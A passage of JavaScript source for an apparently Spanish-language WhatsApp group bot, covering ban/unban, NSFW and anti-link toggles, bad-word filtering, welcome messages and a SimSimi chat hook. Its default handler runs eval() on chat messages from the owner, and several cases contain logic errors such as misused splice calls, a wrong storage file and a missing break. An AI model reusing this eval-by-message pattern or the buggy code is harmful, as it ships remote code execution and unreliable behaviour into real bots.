} else if (isQuotedMsg) {
if (quotedMsg.sender.match('529984907794')) return reply(`🤨`)
addBanned(quotedMsg.sender, args[1], ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido baneado, lo que significa que no podra usar el bot!`, mentioned, true)
} else if (!isNaN(args[1])) {
addBanned(args[1] + '@s.whatsapp.net', args[2], ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido baneado, lo que significa que no podra usar el bot!`, mentioned, true)
}
break
                
case 'unban':
if (!itsMe) return reply(mess.only.owner)
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
unBanned(mentioned[i], ban)
}
mentions(`@${mentioned[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentioned, true)
}if (isQuotedMsg) {
unBanned(quotedMsg.sender, ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentioned, true)
} else if (!isNaN(args[0])) {
unBanned(args[0] + '@s.whatsapp.net', ban)
mentions(`@${mentioned[0].split('@')[0]} Usted a sido desbaneado, ahora podra usar el bot!!`, mentioned, true)
}
break
		
case '+18':                
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)     

if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isNsfw) return reply('*Ya está activo*')          
	nsfw.push(from)                          
	fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))      
	reply(`*[ Activado ]*`)   
} else if (args[0] === '0') {             
	var ini = nsfw.indexOf(from)
	nsfw.splice(ini, 1)           
	fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break
//by Sm330
case 'autostick':            
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)     
if (args.length < 1) return reply('Escribe *1* para activar')                    
if (args[0] === '1') {                             
	if (isAutoSt) return reply('*Ya está activo*')          
	autostick.push(from)             
	fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
	reply(`*[ Activado ]*`)  
	reply(`*ahora, todas las fotos que se envien en el grupo se convertiran en sticker automaticamente*`)  
} else if (args[0] === '0') {           
	var ini = autostick.indexOf(from)
	autostick.splice(ini, 1)                  
	fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
	reply(`Desactivado`)              
} else {                                
	reply('1 para activar, 0 para desactivar')        
}                          
break
					
			case 'antibad':
                                        if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
                                        if (args.length < 1) return reply('Escribe *1* para activar')
                                        if (args[0] === '1') {
                                                if (isBadWord) return reply('*Ya está activo*')
                 	                        badword.push(from)
                 	                        fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
                  	                        reply(`*[ Activado ]*`)
						reply(`*Las personas que envien una mala palabra sera eliminada*. _Para ver la lista de malas palabras usa el comando: listbad_`)  
                                        } else if (args[0] === '0') {
                  	                        var ini = badword.indexOf(from)
						badword.splice(ini, 1)
                 	                        fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
                 	                        reply(`Desactivado`)
             	                        } else {
                 	                        reply('1 para activar, 0 para desactivar')
                	                }
                                        break
                                case 'addbad':
                                
                                        if (!isOwner) return reply(mess.only.ownerB)
                                        if (!isAdmin) return reply(mess.only.admin)
                                        if (args.length < 1) return reply( `Escribe ${prefix}addbad [palabra]. Ejemplo: ${prefix}addbad pto`)
                                        const bw = q
                                        bad.push(bw)
                                        fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
                                        reply('Se añadio con exito')
				
                                        break
                                case 'delbad':
                                
                                        if (!isOwner) return reply(mess.only.ownerB)
                                        if (!isAdmin) return reply(mess.only.admin)
                                        if (args.length < 1) return reply( `Escribe ${prefix}delbad [palabra]. Ejemplo: ${prefix}delbad bego`)
                                        let dbw = q
                                        bad.splice(dbw)
                                        fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
                                        reply('Se quito con exito')
				
                                        break 
                                case 'listbad':
                                
                                        let lbw = `Lista de BAD WORD\nTotal : ${bad.length}\n`
                                        for (let i of bad) {
                                                lbw += `◦ ${i.replace(bad)}\n`
                                        }
                                        await reply(lbw)
                                        break
					case 'antilink':
                                	if (!isGroup) return reply(mess.only.group)
					if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('escriba *1* para activar')
					if (args[0] === '1') {
						if (isAntiLink) return reply('Ya esta activo')
						antilink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('*Anti-link activado ✔️*')
						samu330.sendMessage(from,`Los miembros que manden un link serán eliminados, *OJO* _CULAQUIER TIPO DE LINK_`, text)
					} else if ((args[0]) === '0') {
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('Anti-link desactivado ✔️')
					} else {
						reply('*1 para activar, 0 para desactivar*')
					}
					break
					case 'antigp':
                                	if (!isGroup) return reply(mess.only.group)
					if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('escriba *1* para activar')
					if (args[0] === '1') {
						if (isAntigp) return reply('Ya esta activo')
						antigp.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antigp))
						reply('*Anti-link de grupos activado ✔️*')
						samu330.sendMessage(from,`Los miembros que manden un link de otro grupo serán eliminados`, text)
					} else if ((args[0]) === '0') {
						var ini = antigp.indexOf(from)
						antigp.splice(ini, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antigp))
						reply('Anti-link de grupos desactivado ✔️')
					} else {
						reply('*1 para activar, 0 para desactivar*')
					}
					break
	case 'welcome':
					if (!isGroup) return reply('*Comando solo para grupos*')
					if (!isAdmin) return reply(mess.only.admin)
					if (args.length < 1) return reply('ah? que quieres hacer? *1* para activar y *2* para desactivar')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Ya esta activo')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Se activo con exito')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Se desactivo con exito')
					} else {
						reply('1 para activar, 0 desactivar')
					}
                                      break
	case 'simsimi':   
				if (!isGroup) return reply('Este comando es solo para grupos')  
					if (args.length < 1) return reply('escriba *1* para activar')        
					if (args[0] === '1') {                 
						if (isSimi) return reply('Ya esta activo')            
						simi.push(from)
                                                fs.writeFileSync('./src/simi.json', JSON.stringify(simi))
						reply('*Modo simi activado✅*')
					} else if ((args[0]) === '0') {                      
						var ini = simi.indexOf(from)              
						simi.splice(ini, 1)                    
						fs.writeFileSync('./src/simi.json', JSON.stringify(simi))        
						reply('Modo simsimi off ✔️')                                   
					} else {                               
						reply('*1 para activar, 0 para desactivar*')             
					}



default:
if (body.startsWith(">")) {
if (!itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
}
if (body.startsWith('buenos dias')) {
dias = fs.readFileSync(`./temp/audio/wenas.mp3`)
samu330.sendMessage(from, dias, audio, {quoted: fliveLoc, mimetype: 'audio/mp4', ptt:true, duration: -999999})
}
if (isSimi && !itsMe &&  body != undefined){
res = await getJson(`https://api.simsimi.net/v1/?text=${body}&lang=es`)
reply(res.success)
}
if (isGroup && isAntiLink && isUrl(body) && !isAdmin && body != undefined) {
var sial = sender.split('@')[0] + "@s.whatsapp.net"
samu330.groupRemove(from, [sial])
}
}
} catch (e) {
const emror = String(e)
if (emror.includes('convert')){ 
return
}
if (emror.includes('this.isZero')){ 
return
}	
if (emror.includes('fileLength')){                           
return
}
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[  ERROR  ]"), chalk.keyword("red")(e))
console.log(e)
}
})

